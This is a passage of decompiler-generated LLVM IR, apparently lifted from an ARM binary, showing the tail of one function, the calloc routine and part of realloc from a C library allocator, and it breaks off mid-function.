  store i32 %v18_10cbc, i32* @sb, align 4
  store i32 %v24_10cbc, i32* @fp, align 4
  %v1_10f78 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_10f78

; uselistorder directives
  uselistorder i32 %v2_10e64, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10dec, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10db4, { 1, 0 }
  uselistorder i32 %v0_10d20, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 2, 0, 3 }
  uselistorder i32 %tmp12, { 3, 2, 0, 1 }
  uselistorder i32 %tmp6, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 1, 2, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 7, 8, 0, 1, 2, 3, 9 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 21, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 23, 20, 22, 1, 0, 2, 3, 5, 4, 7, 6, 8, 9 }
  uselistorder i32 -24, { 1, 0 }
  uselistorder label %dec_label_pc_10f70, { 7, 5, 6, 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_10f6c, { 1, 0 }
  uselistorder label %dec_label_pc_10f64, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10f5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10dac, { 2, 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_10f90 = load i32, i32* @r4, align 4
  %v6_10f90 = load i32, i32* @r5, align 4
  %v9_10f90 = load i32, i32* @r6, align 4
  %v12_10f90 = load i32, i32* @lr, align 4
  %v2_10f98 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_10fa8 = mul i32 %arg2, %arg1
  store i32 %v2_10fa8, i32* @r6, align 4
  br i1 %v2_10f98, label %dec_label_pc_10fe0, label %dec_label_pc_10fb0

dec_label_pc_10fb0:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_10fb8 = udiv i32 %v2_10fa8, %arg1
  %v9_10fbc = icmp eq i32 %v2_10fb8, %arg2
  br i1 %v9_10fbc, label %dec_label_pc_10fe0, label %dec_label_pc_10fc4

dec_label_pc_10fc4:                               ; preds = %dec_label_pc_10fb0
  %v0_10fc8 = call i32 @__aeabi_read_tp()
  %v3_10fcc = load i16, i16* @global_var_222f0.75, align 2
  %v4_10fcc = sext i16 %v3_10fcc to i32
  store i32 %v4_10fcc, i32* @r2, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_10fd8 = add i32 %v4_10fcc, %v0_10fc8
  %v4_10fd8 = inttoptr i32 %v3_10fd8 to i32*
  store i32 12, i32* %v4_10fd8, align 4
  br label %dec_label_pc_110a4

dec_label_pc_10fe0:                               ; preds = %dec_label_pc_10fb0, %entry
  %v4_10fe4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 116) to i32*), align 4
  store i32 %v4_10fe4, i32* @r4, align 4
  %v4_10ffc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 120) to i32*), align 4
  store i32 %v4_10ffc, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_10ffc)
  %v0_11010 = load i32, i32* @r5, align 4
  %v2_11010 = add i32 %v0_11010, 16
  %v3_11010 = inttoptr i32 %v2_11010 to i32*
  %v4_11010 = load i32, i32* %v3_11010, align 4
  store i32 %v4_11010, i32* %ip.global-to-local, align 4
  store i32 69660, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11010)
  %v0_1101c = load i32, i32* @r6, align 4
  %v1_11020 = call i32 @malloc(i32 %v0_1101c)
  store i32 %v1_11020, i32* %r4.global-to-local, align 4
  %v2_11024 = icmp eq i32 %v1_11020, 0
  br i1 %v2_11024, label %.thread, label %dec_label_pc_1102c

dec_label_pc_1102c:                               ; preds = %dec_label_pc_10fe0
  %v1_1102c = add i32 %v1_11020, -4
  %v2_1102c = inttoptr i32 %v1_1102c to i32*
  %v3_1102c = load i32, i32* %v2_1102c, align 4
  %v1_11030 = and i32 %v3_1102c, 2
  %v2_11030 = icmp eq i32 %v1_11030, 0
  br i1 %v2_11030, label %dec_label_pc_11038, label %.thread

dec_label_pc_11038:                               ; preds = %dec_label_pc_1102c
  %v1_110386 = add i32 %v3_1102c, -4
  %v1_1103c = and i32 %v1_110386, -4
  store i32 %v1_1103c, i32* @r2, align 4
  %v3_11040 = udiv i32 %v1_1103c, 4
  store i32 %v3_11040, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_1103c, 36
  %v2_11048 = icmp ult i32 %v1_1103c, 33
  %v3_11048 = or i1 %tmp, %v2_11048
  br i1 %v3_11048, label %dec_label_pc_11054, label %dec_label_pc_1104c

dec_label_pc_1104c:                               ; preds = %dec_label_pc_11038
  %v3_1104c = inttoptr i32 %v1_11020 to i8*
  %v4_1104c = call i32 @__GI_memset(i8* %v3_1104c, i32 0, i32 %v1_1103c)
  br label %.thread

dec_label_pc_11054:                               ; preds = %dec_label_pc_11038
  %tmp7 = icmp eq i32 %v1_1103c, 16
  %v2_11058 = inttoptr i32 %v1_11020 to i32*
  store i32 0, i32* %v2_11058, align 4
  %v1_1105c = load i32, i32* %r4.global-to-local, align 4
  %v2_1105c = add i32 %v1_1105c, 4
  %v3_1105c = inttoptr i32 %v2_1105c to i32*
  store i32 0, i32* %v3_1105c, align 4
  %v1_11060 = load i32, i32* %r4.global-to-local, align 4
  %v2_11060 = add i32 %v1_11060, 8
  %v3_11060 = inttoptr i32 %v2_11060 to i32*
  store i32 0, i32* %v3_11060, align 4
  %v2_11064 = icmp ult i32 %v1_1103c, 13
  %v3_11064 = or i1 %tmp7, %v2_11064
  br i1 %v3_11064, label %.thread, label %dec_label_pc_11068

dec_label_pc_11068:                               ; preds = %dec_label_pc_11054
  %v0_11068 = load i32, i32* %ip.global-to-local, align 4
  %v1_1106c = load i32, i32* %r4.global-to-local, align 4
  %v2_1106c = add i32 %v1_1106c, 12
  %v3_1106c = inttoptr i32 %v2_1106c to i32*
  store i32 0, i32* %v3_1106c, align 4
  %v1_11070 = load i32, i32* %r4.global-to-local, align 4
  %v2_11070 = add i32 %v1_11070, 16
  %v3_11070 = inttoptr i32 %v2_11070 to i32*
  store i32 0, i32* %v3_11070, align 4
  %tmp8 = icmp ult i32 %v0_11068, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_11078

dec_label_pc_11078:                               ; preds = %dec_label_pc_11068
  %v0_11078 = load i32, i32* %ip.global-to-local, align 4
  %v7_11078 = icmp eq i32 %v0_11078, 9
  %v1_1107c = load i32, i32* %r4.global-to-local, align 4
  %v2_1107c = add i32 %v1_1107c, 20
  %v3_1107c = inttoptr i32 %v2_1107c to i32*
  store i32 0, i32* %v3_1107c, align 4
  %v1_11080 = load i32, i32* %r4.global-to-local, align 4
  %v2_11080 = add i32 %v1_11080, 24
  %v3_11080 = inttoptr i32 %v2_11080 to i32*
  store i32 0, i32* %v3_11080, align 4
  br i1 %v7_11078, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11078
  %v2_11084 = load i32, i32* %r4.global-to-local, align 4
  %v3_11084 = add i32 %v2_11084, 32
  %v4_11084 = inttoptr i32 %v3_11084 to i32*
  store i32 0, i32* %v4_11084, align 4
  %v2_11088 = load i32, i32* %r4.global-to-local, align 4
  %v3_11088 = add i32 %v2_11088, 28
  %v4_11088 = inttoptr i32 %v3_11088 to i32*
  store i32 0, i32* %v4_11088, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11078, %dec_label_pc_1102c, %dec_label_pc_11068, %dec_label_pc_11054, %dec_label_pc_10fe0, %dec_label_pc_1104c, %bb
  store i32 1, i32* @r1, align 4
  %v0_11098 = load i32, i32* @r5, align 4
  %v2_11098 = add i32 %v0_11098, 48
  %v3_11098 = inttoptr i32 %v2_11098 to i32*
  %v4_11098 = load i32, i32* %v3_11098, align 4
  store i32 %v4_11098, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_11098)
  br label %dec_label_pc_110a4

dec_label_pc_110a4:                               ; preds = %dec_label_pc_10fc4, %.thread
  %v0_110a4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_10f90, i32* @r4, align 4
  store i32 %v6_10f90, i32* @r5, align 4
  store i32 %v9_10f90, i32* @r6, align 4
  store i32 %v12_10f90, i32* @lr, align 4
  ret i32 %v0_110a4

; uselistorder directives
  uselistorder i32 %v1_1103c, { 0, 6, 3, 1, 5, 4, 2 }
  uselistorder i32 %v1_11020, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_110a4, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_110bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_110bc:
  %v0_110bc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_110bc, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_110bc
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_110bc, %bb
  %v10_110cc = phi i32 [ %arg1, %dec_label_pc_110bc ], [ 0, %bb ]
  ret i32 %v10_110cc

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_110d0 = load i32, i32* @r4, align 4
  %v6_110d0 = load i32, i32* @r5, align 4
  %v9_110d0 = load i32, i32* @r6, align 4
  %v12_110d0 = load i32, i32* @r7, align 4
  %v15_110d0 = load i32, i32* @r8, align 4
  %v18_110d0 = load i32, i32* @sb, align 4
  %v21_110d0 = load i32, i32* @sl, align 4
  %v24_110d0 = load i32, i32* @fp, align 4
  %v27_110d0 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_110dc = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_110dc, label %dec_label_pc_110f0, label %dec_label_pc_11100

dec_label_pc_110f0:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_110f4 = call i32 @malloc(i32 %arg2)
  store i32 %v1_110f4, i32* %r0.global-to-local, align 4
  store i32 %v1_110f4, i32* @r4, align 4
  br label %dec_label_pc_11460

dec_label_pc_11100:                               ; preds = %entry
  %v2_11100 = icmp eq i32 %arg2, 0
  br i1 %v2_11100, label %dec_label_pc_11108, label %dec_label_pc_11114

dec_label_pc_11108:                               ; preds = %dec_label_pc_11100
  %v0_11108 = call i32 @free()
  store i32 %v0_11108, i32* %r0.global-to-local, align 4
  %v0_1110c = load i32, i32* @r6, align 4
  store i32 %v0_1110c, i32* @r4, align 4
  br label %dec_label_pc_11460

dec_label_pc_11114:                               ; preds = %dec_label_pc_11100
  store i32 116, i32* %r3.global-to-local, align 4
  %v4_1111c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 116) to i32*), align 4
  store i32 %v4_1111c, i32* @r4, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 %v4_1111c, i32* %r2.global-to-local, align 4
  %v4_11128 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 72) to i32*), align 4
  store i32 %v4_11128, i32* %r1.global-to-local, align 4
  %v2_1112c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1112c, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  %v4_11134 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 120) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_11134)
  %v0_11140 = load i32, i32* @r4, align 4
  store i32 %v0_11140, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r1.global-to-local, align 4
  %v4_1114c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 16) to i32*), align 4
  store i32 %v4_1114c, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_11158.408 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1114c)
  %v0_11158 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_11158, -32
  br i1 %tmp36, label %dec_label_pc_1117c, label %dec_label_pc_11160

dec_label_pc_11160:                               ; preds = %dec_label_pc_11114
  store i32 70016, i32* %r2.global-to-local, align 4
  %v0_11164 = call i32 @__aeabi_read_tp()
  store i32 %v0_11164, i32* %r0.global-to-local, align 4
  %v3_11168 = load i16, i16* @global_var_222f0.75, align 2
  %v4_11168 = sext i16 %v3_11168 to i32
  store i32 %v4_11168, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_11174 = add i32 %v4_11168, %v0_11164
  %v4_11174 = inttoptr i32 %v3_11174 to i32*
  store i32 12, i32* %v4_11174, align 4
  br label %dec_label_pc_11460

dec_label_pc_1117c:                               ; preds = %dec_label_pc_11114
  %v1_1117c = add i32 %v0_11158, 11
  store i32 %v1_1117c, i32* %r0.global-to-local, align 4
  %v0_11180 = load i32, i32* @r5, align 4
  %v1_11180 = add i32 %v0_11180, -4
  %v2_11180 = inttoptr i32 %v1_11180 to i32*
  %v3_11180 = load i32, i32* %v2_11180, align 4
  store i32 %v3_11180, i32* %r2.global-to-local, align 4
  %v2_11184 = icmp ugt i32 %v1_1117c, 14
  %v7_11184 = icmp eq i32 %v1_1117c, 15
  %v2_11188 = xor i1 %v2_11184, true
  %v3_11188 = or i1 %v7_11184, %v2_11188
  br i1 %v3_11188, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_1117c
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_1117c, %bb
  %v2_1118c = xor i1 %v7_11184, true
  %v3_1118c = and i1 %v2_11184, %v2_1118c
  br i1 %v3_1118c, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_1118c = and i32 %v1_1117c, -8
  store i32 %v5_1118c, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_11190 = and i32 %v3_11180, 2
  %v2_11190 = icmp eq i32 %v1_11190, 0
  %v1_11194 = add i32 %v0_11180, -8
  store i32 %v1_11194, i32* @sl, align 4
  %v1_11198 = and i32 %v3_11180, -4
  store i32 %v1_11198, i32* @r6, align 4
  br i1 %v2_11190, label %dec_label_pc_111a0, label %dec_label_pc_11378

dec_label_pc_111a0:                               ; preds = %bb29
  %v1_111a0 = load i32, i32* @sb, align 4
  %v3_111a0 = icmp ult i32 %v1_11198, %v1_111a0
  br i1 %v3_111a0, label %dec_label_pc_111ac, label %bb30

bb30:                                             ; preds = %dec_label_pc_111a0
  store i32 %v1_11198, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11310

dec_label_pc_111ac:                               ; preds = %dec_label_pc_111a0
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_111b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 68) to i32*), align 4
  store i32 %v4_111b4, i32* %r0.global-to-local, align 4
  %v1_111b8 = add i32 %v4_111b4, 44
  %v2_111b8 = inttoptr i32 %v1_111b8 to i32*
  %v3_111b8 = load i32, i32* %v2_111b8, align 4
  store i32 %v3_111b8, i32* %r3.global-to-local, align 4
  %v2_111bc = add i32 %v1_11198, %v1_11194
  store i32 %v2_111bc, i32* @r4, align 4
  %v9_111c0 = icmp eq i32 %v2_111bc, %v3_111b8
  %v1_111c4 = add i32 %v2_111bc, 4
  %v2_111c4 = inttoptr i32 %v1_111c4 to i32*
  %v3_111c4 = load i32, i32* %v2_111c4, align 4
  store i32 %v3_111c4, i32* %r1.global-to-local, align 4
  br i1 %v9_111c0, label %dec_label_pc_111cc, label %dec_label_pc_11208

dec_label_pc_111cc:                               ; preds = %dec_label_pc_111ac
  %v1_111cc = and i32 %v3_111c4, -4
  %v2_111d0 = add i32 %v1_111cc, %v1_11198
  store i32 %v2_111d0, i32* %r1.global-to-local, align 4
  %v1_111d4 = add i32 %v1_111a0, 16
  store i32 %v1_111d4, i32* %r3.global-to-local, align 4
  %v3_111d8 = icmp ult i32 %v2_111d0, %v1_111d4
  br i1 %v3_111d8, label %dec_label_pc_1125c, label %dec_label_pc_111e0

dec_label_pc_111e0:                               ; preds = %dec_label_pc_111cc
  %v2_111e0 = sub i32 %v2_111d0, %v1_111a0
  %v1_111e4 = urem i32 %v3_11180, 2
  %v2_111e8 = add i32 %v1_111a0, %v1_11194
  store i32 %v2_111e8, i32* %r1.global-to-local, align 4
  %v2_111ec = or i32 %v1_111a0, %v1_111e4
  store i32 %v2_111ec, i32* %r2.global-to-local, align 4
  %v1_111f0 = or i32 %v2_111e0, 1
  store i32 %v1_111f0, i32* %r3.global-to-local, align 4
  store i32 %v0_11180, i32* @r4, align 4
  store i32 %v2_111ec, i32* %v2_11180, align 4
  %v0_111fc = load i32, i32* %r1.global-to-local, align 4
  %v1_111fc = load i32, i32* %r0.global-to-local, align 4
  %v2_111fc = add i32 %v1_111fc, 44
  %v3_111fc = inttoptr i32 %v2_111fc to i32*
  store i32 %v0_111fc, i32* %v3_111fc, align 4
  %v0_11200 = load i32, i32* %r3.global-to-local, align 4
  %v1_11200 = load i32, i32* %r1.global-to-local, align 4
  %v2_11200 = add i32 %v1_11200, 4
  %v3_11200 = inttoptr i32 %v2_11200 to i32*
  store i32 %v0_11200, i32* %v3_11200, align 4
  br label %dec_label_pc_11444

dec_label_pc_11208:                               ; preds = %dec_label_pc_111ac
  %v1_11208 = and i32 %v3_111c4, -2
  %v2_1120c = add i32 %v1_11208, %v2_111bc
  store i32 %v2_1120c, i32* %r3.global-to-local, align 4
  %v1_11210 = add i32 %v2_1120c, 4
  %v2_11210 = inttoptr i32 %v1_11210 to i32*
  %v3_11210 = load i32, i32* %v2_11210, align 4
  store i32 %v3_11210, i32* %r3.global-to-local, align 4
  %v1_11214 = urem i32 %v3_11210, 2
  %v2_11214 = icmp eq i32 %v1_11214, 0
  br i1 %v2_11214, label %dec_label_pc_1121c, label %dec_label_pc_1125c

dec_label_pc_1121c:                               ; preds = %dec_label_pc_11208
  %v1_1121c = and i32 %v3_111c4, -4
  store i32 %v1_1121c, i32* %r3.global-to-local, align 4
  %v2_11220 = add i32 %v1_1121c, %v1_11198
  store i32 %v2_11220, i32* %r0.global-to-local, align 4
  %v3_11224 = icmp ult i32 %v2_11220, %v1_111a0
  br i1 %v3_11224, label %dec_label_pc_1125c, label %dec_label_pc_1122c

dec_label_pc_1122c:                               ; preds = %dec_label_pc_1121c
  %v1_1122c = add i32 %v1_11198, %v0_11180
  %v2_1122c = inttoptr i32 %v1_1122c to i32*
  %v3_1122c = load i32, i32* %v2_1122c, align 4
  store i32 %v3_1122c, i32* %r1.global-to-local, align 4
  %v1_11230 = add i32 %v3_1122c, 12
  %v2_11230 = inttoptr i32 %v1_11230 to i32*
  %v3_11230 = load i32, i32* %v2_11230, align 4
  store i32 %v3_11230, i32* %r3.global-to-local, align 4
  %v9_11234 = icmp eq i32 %v3_11230, %v2_111bc
  %v1_11238 = add i32 %v2_111bc, 12
  %v2_11238 = inttoptr i32 %v1_11238 to i32*
  %v3_11238 = load i32, i32* %v2_11238, align 4
  store i32 %v3_11238, i32* %r2.global-to-local, align 4
  br i1 %v9_11234, label %dec_label_pc_11240, label %dec_label_pc_1124c

dec_label_pc_11240:                               ; preds = %dec_label_pc_1122c
  %v1_11240 = add i32 %v3_11238, 8
  %v2_11240 = inttoptr i32 %v1_11240 to i32*
  %v3_11240 = load i32, i32* %v2_11240, align 4
  store i32 %v3_11240, i32* %r3.global-to-local, align 4
  %v9_11244 = icmp eq i32 %v3_11240, %v2_111bc
  br i1 %v9_11244, label %dec_label_pc_11250, label %dec_label_pc_1124c

dec_label_pc_1124c:                               ; preds = %dec_label_pc_1122c, %dec_label_pc_11240
  %v0_1124c = call i32 @abort()
  store i32 %v0_1124c, i32* %r0.global-to-local, align 4
  %v0_11250.pre = load i32, i32* @r1, align 4
  %v1_11250.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_11250

dec_label_pc_11250:                               ; preds = %dec_label_pc_11240, %dec_label_pc_1124c
  %v1_11250 = phi i32 [ %v3_11238, %dec_label_pc_11240 ], [ %v1_11250.pre, %dec_label_pc_1124c ]
  %v0_11250 = phi i32 [ %v3_1122c, %dec_label_pc_11240 ], [ %v0_11250.pre, %dec_label_pc_1124c ]
  %v2_11250 = add i32 %v1_11250, 8
  %v3_11250 = inttoptr i32 %v2_11250 to i32*
  store i32 %v0_11250, i32* %v3_11250, align 4
  %v0_11254 = load i32, i32* %r2.global-to-local, align 4
  %v1_11254 = load i32, i32* %r1.global-to-local, align 4
  %v2_11254 = add i32 %v1_11254, 12
  %v3_11254 = inttoptr i32 %v2_11254 to i32*
  store i32 %v0_11254, i32* %v3_11254, align 4
  %v1_11310.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11310

dec_label_pc_1125c:                               ; preds = %dec_label_pc_111cc, %dec_label_pc_1121c, %dec_label_pc_11208
  %v1_1125c = add i32 %v1_111a0, -7
  store i32 %v1_1125c, i32* %r0.global-to-local, align 4
  %v1_11260 = call i32 @malloc(i32 %v1_1125c)
  store i32 %v1_11260, i32* @r0, align 4
  store i32 %v1_11260, i32* %r1.global-to-local, align 4
  %v2_11264 = icmp eq i32 %v1_11260, 0
  br i1 %v2_11264, label %bb31, label %dec_label_pc_11270

bb31:                                             ; preds = %dec_label_pc_1125c
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_11444

dec_label_pc_11270:                               ; preds = %dec_label_pc_1125c
  %v1_11278.pre = load i32, i32* @r4, align 4
  %v1_11270 = add i32 %v1_11260, -4
  %v2_11270 = inttoptr i32 %v1_11270 to i32*
  %v3_11270 = load i32, i32* %v2_11270, align 4
  store i32 %v3_11270, i32* @r3, align 4
  %v1_11274 = add i32 %v1_11260, -8
  store i32 %v1_11274, i32* @r7, align 4
  %v9_11278 = icmp eq i32 %v1_11274, %v1_11278.pre
  br i1 %v9_11278, label %.thread2, label %dec_label_pc_11288

.thread2:                                         ; preds = %dec_label_pc_11270
  %v2_1127c = and i32 %v3_11270, -4
  store i32 %v2_1127c, i32* %r3.global-to-local, align 4
  %v2_11280 = load i32, i32* @r6, align 4
  %v3_11280 = add i32 %v2_11280, %v2_1127c
  store i32 %v3_11280, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11310

dec_label_pc_11288:                               ; preds = %dec_label_pc_11270
  %v0_11288 = load i32, i32* @r6, align 4
  %v1_11288 = add i32 %v0_11288, -4
  store i32 %v1_11288, i32* @r2, align 4
  %v3_1128c = udiv i32 %v1_11288, 4
  store i32 %v3_1128c, i32* @ip, align 4
  %tmp37 = and i32 %v1_11288, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_11294 = icmp ult i32 %v1_11288, 36
  %v3_11294 = or i1 %tmp38, %v2_11294
  %v0_112a4 = load i32, i32* @r5, align 4
  br i1 %v3_11294, label %dec_label_pc_112a4, label %dec_label_pc_11298

dec_label_pc_11298:                               ; preds = %dec_label_pc_11288
  store i32 %v0_112a4, i32* @r1, align 4
  %v0_1129c = call i32 @memcpy()
  store i32 %v0_1129c, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_112a4:                               ; preds = %dec_label_pc_11288
  %v1_112a4 = inttoptr i32 %v0_112a4 to i32*
  %v2_112a4 = load i32, i32* %v1_112a4, align 4
  store i32 %v2_112a4, i32* %r3.global-to-local, align 4
  %v2_112a8 = inttoptr i32 %v1_11260 to i32*
  store i32 %v2_112a4, i32* %v2_112a8, align 4
  %v0_112ac = load i32, i32* @r5, align 4
  %v1_112ac = add i32 %v0_112ac, 4
  %v2_112ac = inttoptr i32 %v1_112ac to i32*
  %v3_112ac = load i32, i32* %v2_112ac, align 4
  store i32 %v3_112ac, i32* %r3.global-to-local, align 4
  %v1_112b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_112b0 = add i32 %v1_112b0, 4
  %v3_112b0 = inttoptr i32 %v2_112b0 to i32*
  store i32 %v3_112ac, i32* %v3_112b0, align 4
  %v0_112b4 = load i32, i32* @r5, align 4
  %v1_112b4 = add i32 %v0_112b4, 8
  %v2_112b4 = inttoptr i32 %v1_112b4 to i32*
  %v3_112b4 = load i32, i32* %v2_112b4, align 4
  store i32 %v3_112b4, i32* %r3.global-to-local, align 4
  %v0_112b8 = load i32, i32* @ip, align 4
  %v1_112bc = load i32, i32* %r1.global-to-local, align 4
  %v2_112bc = add i32 %v1_112bc, 8
  %v3_112bc = inttoptr i32 %v2_112bc to i32*
  store i32 %v3_112b4, i32* %v3_112bc, align 4
  %tmp39 = icmp ult i32 %v0_112b8, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_112c4

dec_label_pc_112c4:                               ; preds = %dec_label_pc_112a4
  %v0_112c4 = load i32, i32* @r5, align 4
  %v1_112c4 = add i32 %v0_112c4, 12
  %v2_112c4 = inttoptr i32 %v1_112c4 to i32*
  %v3_112c4 = load i32, i32* %v2_112c4, align 4
  store i32 %v3_112c4, i32* %r3.global-to-local, align 4
  %v1_112c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_112c8 = add i32 %v1_112c8, 12
  %v3_112c8 = inttoptr i32 %v2_112c8 to i32*
  store i32 %v3_112c4, i32* %v3_112c8, align 4
  %v0_112cc = load i32, i32* @r5, align 4
  %v1_112cc = add i32 %v0_112cc, 16
  %v2_112cc = inttoptr i32 %v1_112cc to i32*
  %v3_112cc = load i32, i32* %v2_112cc, align 4
  store i32 %v3_112cc, i32* %r3.global-to-local, align 4
  %v0_112d0 = load i32, i32* @ip, align 4
  %v1_112d4 = load i32, i32* %r1.global-to-local, align 4
  %v2_112d4 = add i32 %v1_112d4, 16
  %v3_112d4 = inttoptr i32 %v2_112d4 to i32*
  store i32 %v3_112cc, i32* %v3_112d4, align 4
  %tmp40 = icmp ult i32 %v0_112d0, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_112dc

dec_label_pc_112dc:                               ; preds = %dec_label_pc_112c4
  %v0_112dc = load i32, i32* @r5, align 4
  %v1_112dc = add i32 %v0_112dc, 20
  %v2_112dc = inttoptr i32 %v1_112dc to i32*
  %v3_112dc = load i32, i32* %v2_112dc, align 4
  store i32 %v3_112dc, i32* %r3.global-to-local, align 4
  %v1_112e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_112e0 = add i32 %v1_112e0, 20
  %v3_112e0 = inttoptr i32 %v2_112e0 to i32*
  store i32 %v3_112dc, i32* %v3_112e0, align 4
  %v0_112e4 = load i32, i32* @r5, align 4
  %v1_112e4 = add i32 %v0_112e4, 24
  %v2_112e4 = inttoptr i32 %v1_112e4 to i32*
  %v3_112e4 = load i32, i32* %v2_112e4, align 4
  store i32 %v3_112e4, i32* %r3.global-to-local, align 4
  %v1_112e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_112e8 = add i32 %v1_112e8, 24
  %v3_112e8 = inttoptr i32 %v2_112e8 to i32*
  store i32 %v3_112e4, i32* %v3_112e8, align 4
  %v0_112ec = load i32, i32* @ip, align 4
  %v7_112ec = icmp eq i32 %v0_112ec, 9
  br i1 %v7_112ec, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_112dc
  %v1_112f0 = load i32, i32* @r5, align 4
  %v2_112f0 = add i32 %v1_112f0, 28
  %v3_112f0 = inttoptr i32 %v2_112f0 to i32*
  %v4_112f0 = load i32, i32* %v3_112f0, align 4
  store i32 %v4_112f0, i32* %r3.global-to-local, align 4
  %v2_112f4 = load i32, i32* %r1.global-to-local, align 4
  %v3_112f4 = add i32 %v2_112f4, 28
  %v4_112f4 = inttoptr i32 %v3_112f4 to i32*
  store i32 %v4_112f0, i32* %v4_112f4, align 4
  %v1_112f8 = load i32, i32* @r5, align 4
  %v2_112f8 = add i32 %v1_112f8, 32
  %v3_112f8 = inttoptr i32 %v2_112f8 to i32*
  %v4_112f8 = load i32, i32* %v3_112f8, align 4
  store i32 %v4_112f8, i32* %r3.global-to-local, align 4
  %v2_112fc = load i32, i32* %r1.global-to-local, align 4
  %v3_112fc = add i32 %v2_112fc, 32
  %v4_112fc = inttoptr i32 %v3_112fc to i32*
  store i32 %v4_112f8, i32* %v4_112fc, align 4
  br label %.thread6

